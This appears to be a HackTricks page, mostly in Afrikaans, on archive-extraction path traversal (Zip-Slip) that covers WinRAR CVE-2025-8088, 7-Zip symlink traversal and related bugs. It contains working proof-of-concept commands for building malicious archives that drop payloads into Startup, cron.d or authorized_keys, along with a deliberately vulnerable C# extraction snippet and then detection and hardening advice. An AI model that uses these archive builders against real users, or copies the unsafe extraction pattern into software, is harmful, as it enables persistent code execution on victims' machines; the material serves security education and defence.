# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Oorsig

Baie argiefformate (ZIP, RAR, TAR, 7-ZIP, ens.) laat elke inskrywing toe om sy eie **internal path** te hê. Wanneer 'n uittrekgereedskap daardie pad blindelings eerbiedig, sal 'n gemanipuleerde lêernaam wat `..` of 'n **absolute path** (bv. `C:\Windows\System32\`) bevat, buite die gebruiker-gekoze gids geskryf word.
Hierdie klas kwesbaarheid is wyd bekend as *Zip-Slip* of **archive extraction path traversal**.

Gevolge wissel van die oorskryf van arbitrêre lêers tot die direkte bereik van **remote code execution (RCE)** deur 'n payload in 'n **auto-run** ligging soos die Windows *Startup* folder te plaas.

## Hoofoorsaak

1. 'n Aanvaller skep 'n argief waar een of meer lêerheaders bevat:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Of gemanipuleerde **symlinks** wat buite die teiken-gids oplos (algemeen in ZIP/TAR op *nix*).
2. Die slagoffer haal die argief uit met 'n kwesbare hulpmiddel wat die ingeslote pad vertrou (of symlinks volg) in plaas daarvan om dit te saneer of die uittrekking binne die gekose gids af te dwing.
3. Die lêer word in die aanvaller-beheerde ligging geskryf en uitgevoer/gelaai die volgende keer wat die stelsel of gebruiker daardie pad aktiveer.

### .NET `Path.Combine` + `ZipArchive` traversal

'n Algemene .NET anti-patroon is om die beoogde bestemming te kombineer met **deur die gebruiker beheer** `ZipArchiveEntry.FullName` en uit te pak sonder padnormalisering:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- As `entry.FullName` met `..\\` begin, sal dit traverseer; as dit 'n **absolute path** is, word die linkerkant-komponent heeltemal verwerp, wat 'n **arbitrary file write** as die ekstraksie-identiteit tot gevolg het.
- Proof-of-concept-argief om in 'n suster-`app` gids te skryf wat deur 'n geplande skandeerder gemonitor word:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Deur daardie ZIP in die gemonitorde inkassie te laat val, resulteer dit in `C:\samples\app\0xdf.txt`, wat bewys lewer van traversering buite `C:\samples\queue\` en volg-op primitives moontlik maak (bv. DLL hijacks).

## Werklike voorbeeld – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (inklusive die `rar` / `unrar` CLI, die DLL en die portable source) het nie lêernaamvalidasie tydens ekstraksie uitgevoer nie.
'n Kwaadwillige RAR-argief wat 'n inskrywing soos die volgende bevat:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
sou uiteindelik **buite** die geselekteerde uitvoergids beland en binne die gebruiker se *Startup*-gids. Na aanmelding voer Windows outomaties alles wat daar teenwoordig is uit, wat *volhoubare* RCE verskaf.

### Skep van 'n PoC-argief (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opsies gebruik:
* `-ep`  – berg lêerpaaie presies soos gegee (moet die leiende `./` nie sny nie).

Lewer `evil.rar` aan die slagoffer en instrueer hulle om dit met 'n kwesbare WinRAR-build uit te pak.

### Waargeneemde uitbuiting in die wild

ESET het RomCom (Storm-0978/UNC2596) spear-phishing veldtogte gerapporteer wat RAR-argiewe aangeheg het en CVE-2025-8088 misbruik het om aangepaste backdoors te plaas en ransomware-operasies te fasiliteer.

## Nuwe gevalle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. Gebruikersinteraksie is net *opening/extracting* van die argief.
* **Geaffekteer**: 7-Zip 21.02–24.09 (Windows & Linux builds). Gefikseer in **25.00** (Julie 2025) en later.
* **Impact path**: Oorskryf `Start Menu/Programs/Startup` of diens-lokasies wat opgestart word → kode loop by volgende aanmelding of diensherlaai.
* **Vinnige PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Op 'n gepatchete build sal `/etc/cron.d` nie aangeraak word nie; die symlink word binne /tmp/target as 'n skakel uitgepak.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Geaffekteer**: `github.com/mholt/archiver` ≤ 3.5.1 (projek nou verouderd).
* **Fix**: Skakel oor na `mholt/archives` ≥ 0.1.0 of implementeer kanoniese-pad kontroles voor skryf.
* **Minimale reproduksie**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Opsporingswenke

* **Statiese inspeksie** – Lys argiefentries en merk enige naam wat `../`, `..\\`, *absolute paths* (`/`, `C:`) bevat of entries van die tipe *symlink* waarvan die teiken buite die uitpakgids is.
* **Kanonisering** – Verseker `realpath(join(dest, name))` begin steeds met `dest`. Weier andersins.
* **Sandbox extraction** – Pak uit in 'n weggooibare gids met 'n *veilige* extractor (bv. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) en verifieer dat die ontstaande paaie binne daardie gids bly.
* **Eindpuntmonitering** – Gee alarm oor nuwe uitvoerbare lêers wat in `Startup`/`Run`/`cron`-lokasies geskryf word kort nadat 'n argief deur WinRAR/7-Zip/etc. oopgemaak is.

## Mitigasie & Verharding

1. **Update the extractor** – WinRAR 7.13+ en 7-Zip 25.00+ implementeer pad-/symlink-sanitisering. Beide instrumente het steeds geen outomatiese opdatering nie.
2. Pak argiewe uit met “**Do not extract paths**” / “**Ignore paths**” waar moontlik.
3. Op Unix, laat regte val & mount 'n **chroot/namespace** voordat jy uitpak; op Windows, gebruik **AppContainer** of 'n sandbox.
4. As jy eie kode skryf, normaliseer met `realpath()`/`PathCanonicalize()` **voor** create/write, en weier enige entry wat die bestemming ontsnap.

## Bykomende geaffekteer / Historiese gevalle

* 2018 – Massiewe *Zip-Slip* advisering deur Snyk wat baie Java/Go/JS-biblioteke raak.
* 2023 – 7-Zip CVE-2023-4011, vergelykbare traversering tydens `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR-uitpak traversering in slugs (patch in v1.2).
* Enige eie uitpak-logika wat versuim om `PathCanonicalize` / `realpath` aan te roep voor skryf.

## Verwysings

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
